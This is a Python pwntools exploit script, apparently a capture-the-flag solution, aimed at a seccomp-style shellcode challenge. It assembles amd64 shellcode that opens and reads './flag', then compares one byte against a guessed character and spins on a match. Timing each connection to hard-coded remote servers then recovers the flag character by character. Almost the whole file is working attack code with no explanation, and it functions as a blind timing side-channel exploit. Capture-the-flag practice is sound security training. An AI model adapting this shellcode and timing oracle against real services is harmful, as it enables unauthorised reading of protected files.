# encoding=utf-8
from pwn import *

file_path = "./chall"
context.arch = "amd64"
# context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(file_path)
debug = 0
# if debug:
#     p = process([file_path])
#     gdb.attach(p, "b *$rebase(0xC94)")
#     libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#     one_gadget = 0x0
#
# else:
#     p = remote('', 0)
#     libc = ELF('')
#     one_gadget = 0x0


def pwn(p, index, ch):

    # open
    # shellcode = "push 0x10032aaa; pop rdi; shr edi, 12; xor esi, esi; xor esi, esi; pop rax; syscall;"
    shellcode = '''push 0x10034aaa;pop rdi;shr edi, 12;xor esi, esi;push 2;pop rax;syscall;'''

    shellcode += "add r15,1;cmp r15 , 0x14; jle $-24;"

    # read(rax, 0x10040, 0x50)
    # shellcode += "mov rdi, rax; xor eax, eax; push 0x50; pop rdx; push 0x10040aaa; pop rsi; shr esi, 12; syscall;"
    shellcode += "mov rdi, rax; xor eax, eax; push 0x50; pop rdx; push 0x10040aaa; pop rsi; shr esi, 12; syscall;"

    # cmp and jz
    if index == 0:
        shellcode += "cmp byte ptr[rsi+{0}], {1}; jz $-3; ret".format(index, ch)
    else:
        shellcode += "cmp byte ptr[rsi+{0}], {1}; jz $-4; ret".format(index, ch)

    shellcode = asm(shellcode)

    # p.sendlineafter("execution-box.\n", read_next.ljust(0x30))

    p.sendafter("\n", shellcode.ljust(0x40 - 14, b'a') + b'./flag')


index = 1
ans = []
while True:
    for ch in range(0x20, 127):
        if debug:
            p = process([file_path])
        else:
            # p = remote('8.131.246.36', 40334)
            p = remote("47.104.169.149",25178)
        pwn(p, index, ch)
        start = time.time()
        try:
            p.recv(timeout=2)
        except:
            pass
        end = time.time()
        p.close()
        if end - start > 1.5:
            ans.append(ch)
            print("".join([chr(i) for i in ans]))
            break
    else:
        print("".join([chr(i) for i in ans]))
        break
    index = index + 1
    print(ans)

print("".join([chr(i) for i in ans]))